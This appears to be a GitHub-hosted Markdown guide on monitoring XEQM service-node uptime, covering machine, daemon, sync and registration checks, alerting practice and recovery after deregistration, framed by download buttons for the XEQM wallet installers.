![XEQM WALLET](assets/banner-article.png)

# Monitor XEQM node uptime

<p align="center"><a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe"><img src="assets/button-windows.png" alt="Download for Windows" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2F90F3?style=for-the-badge&labelColor=11141B&logo=apple&logoColor=white" alt="Download for macOS" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2F90F3?style=for-the-badge&labelColor=11141B&logo=linux&logoColor=white" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows" /> | Windows 10 or 11, 64-bit | [`XEQM-GUI-2.3.6-win.exe`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe) |
| <img src="https://img.shields.io/badge/macOS-1371E6?style=flat-square&logo=apple&logoColor=white" alt="macOS" /> | macOS, Apple Silicon | [`XEQM-GUI-2.3.6-mac.dmg`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg) |
| <img src="https://img.shields.io/badge/Linux-1371E6?style=flat-square&logo=linux&logoColor=white" alt="Linux" /> | x64 Linux, AppImage | [`XEQM-GUI-2.3.6-linux.AppImage`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage) |

</div>


All versions and checksums are on the [XEQM WALLET release page](https://github.com/XEQMFoundation/XEQM-Wallet/releases/tag/v2.3.6).

Requirements follow the platforms the release ships assets for. No minimum OS build or disk figure is published for this tag.

> Only download from this GitHub release page.

A service node is judged on whether it is present when its uptime window arrives, so monitoring is not optional equipment. Three checks cover most of it: is the machine up, is the daemon synced, and is the node still registered. An alert on any of them turns a silent deregistration into a message you can act on.

## Why uptime is the whole job

The bond is fixed and the hardware is a purchase. What varies is whether the node answers when the network checks, and that is the variable an operator actually controls.

Everything on this page is a way of finding out sooner that it stopped.

## Check one: the machine

A ping, a TCP check on the peer port, or the host's own monitoring. The question is whether the machine is reachable at all.

A machine that reboots for updates or loses power will fail this check, and the fix is a restart policy and a power plan rather than anything in the wallet.

## Check two: the daemon

The daemon can stop while the machine stays up: a crash, an out-of-memory kill, a data directory that became unwritable. A process check catches it, and a service unit that restarts on failure covers the common case.

Check that the process is alive and that it is answering, because a process that is running and stuck looks identical from outside. [XEQM daemon fails to start on Linux](https://github.com/XEQMFoundation/platform-setup/blob/main/xeqm-daemon-fails-to-start-linux.md) covers the startup failures.

## Check three: the chain

A daemon that is running but behind cannot answer correctly. Compare its height with a reference, or read the sync state through a status query.

This is the check that catches a disk filling up or a peer connection that has quietly stopped. [Disk space for the XEQM chain](https://github.com/XEQMFoundation/platform-setup/blob/main/how-much-disk-for-xeqm-blockchain.md) covers the space.

## Check four: the registration

A node can be deregistered while every other check passes, because deregistration is a decision the network made rather than a failure you can see locally.

Query the node's service status and alert on a change. That is the check that tells you the outcome rather than the cause. [Why an XEQM node gets deregistered](https://github.com/XEQMFoundation/account-guide/blob/main/why-was-my-xeqm-node-deregistered.md) covers what leads to it.

## What the daemon will tell you

The node exposes status through its RPC interface, including service-node status and the general chain information. Those are the same calls an operator uses to answer "is it healthy" without guessing.

Read them from the terminal or a small script, and keep the output short enough that an alert can include it. [XEQM GUI or the CLI wallet](https://github.com/XEQMFoundation/platform-setup/blob/main/xeqm-gui-or-cli-wallet.md) covers the two surfaces.

## Logs, and how much to keep

The daemon's log is where a failure explains itself, and a rotation policy keeps it from filling a disk. Keep enough to cover the period between checks.

Changing the log level at runtime is possible, which is useful when you are chasing something and do not want to restart the node.

## How often to check

Frequently enough to act before a window is missed, and no more often than the machine can afford. A check every minute is cheap; an alert that fires every minute is not.

Alert on state changes rather than on every sample, or the alert becomes noise and gets ignored.

## Where alerts should go

Somewhere you will see them at three in the morning. A channel you check daily is a log, not an alert.

Include the check that failed and the last known height in the message, so the first response is a decision rather than an investigation.

## What a false alert costs

An alert that fires for a harmless blip teaches you to ignore alerts. That is worse than no monitoring, because it converts a real warning into noise you have learned to dismiss.

Alert on state that persists: two failed checks in a row, or a height that has not moved in ten minutes. A single missed ping is not an incident.
## Watching disk and logs

A node's disk fills slowly and then stops it. A check on free space, set well above the chain's size, catches that before the daemon does.

Log rotation is the other half. A node that writes for months without rotation is a node that will fill a disk with its own history.

## What to do after a deregistration

Fix the cause before re-registering, and write down which check failed. A node that comes back without a fix will fail again, and the second failure is harder to explain to a pool contributor.

Then confirm the bond returned and the registration is fresh before considering the incident closed.

## Why a second pair of eyes helps

A monitor tells you a node is down; it does not tell you why. A second person who knows the setup cuts the diagnosis in half, and so does a written note of what normal looks like.

Both cost almost nothing and both matter on the night something breaks.

## What a status page should show

Four lines: the machine reachable, the daemon answering, the height advancing, the node registered. That is enough for a glance to answer the only question that matters.

Anything more elaborate is for diagnosis, and diagnosis is what you do after one of the four lines is red.

## What to do when you are away

An alert that only reaches a screen you are sitting at is a log. Route it to something that follows you, and test the route once by triggering it deliberately.

A single test alert is worth more than a month of unverified configuration.

## What monitoring does not fix

It does not prevent a failure. It shortens the time between a failure and a response, which is the part that decides whether a window is missed.

A monitored node can still be deregistered. An unmonitored one usually is, and the gap between the failure and the discovery is the whole of the difference.

## What to do when an alert fires

Confirm which check failed, fix the cause, and confirm the node is registered again before assuming the incident is over. A node that restarts but does not rejoin is still down.

Keep a short note of what happened and what fixed it. The second occurrence is much faster with the first one written down.

## What a quiet week looks like

A well-run node is boring: the height advances, the checks stay green, and nothing needs doing. That quiet is the signal, and it is only meaningful because the checks are running.

An operator who stops looking during a quiet month is the one who finds out from a balance.

## The summary

Machine, daemon, chain, registration. Alert on state changes, send the alert where you will see it, and keep the log long enough to explain a failure.

That is a small amount of work that protects a large bond. [How much XEQM runs a service node](https://github.com/XEQMFoundation/account-guide/blob/main/how-much-xeqm-to-run-a-service-node.md) covers the stake it protects.

## Frequently asked questions

### Do I need special software to monitor a node?

No. A reachability check, a process check and a status query, wired to an alert, cover the essentials.

### Can a node be deregistered while it is running?

Yes. Deregistration follows missed uptime windows, which a running but unsynced or unreachable node will miss.

### What should an alert contain?

Which check failed and the last known chain height, so the first response can be a decision.

### How often should I check?

Often enough to respond before a window is missed, with alerts on state changes rather than every sample.

---

<p align="center"><a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe"><img src="assets/button-windows.png" alt="Download for Windows" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2F90F3?style=for-the-badge&labelColor=11141B&logo=apple&logoColor=white" alt="Download for macOS" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2F90F3?style=for-the-badge&labelColor=11141B&logo=linux&logoColor=white" alt="Download for Linux" /></a></p>

## Related guides

- [How much XEQM runs a service node](https://github.com/XEQMFoundation/account-guide/blob/main/how-much-xeqm-to-run-a-service-node.md)
- [Staking XEQM with less than 200K](https://github.com/XEQMFoundation/account-guide/blob/main/can-i-stake-xeqm-with-less.md)
- [XEQM service node hardware](https://github.com/XEQMFoundation/account-guide/blob/main/xeqm-service-node-hardware-requirements.md)
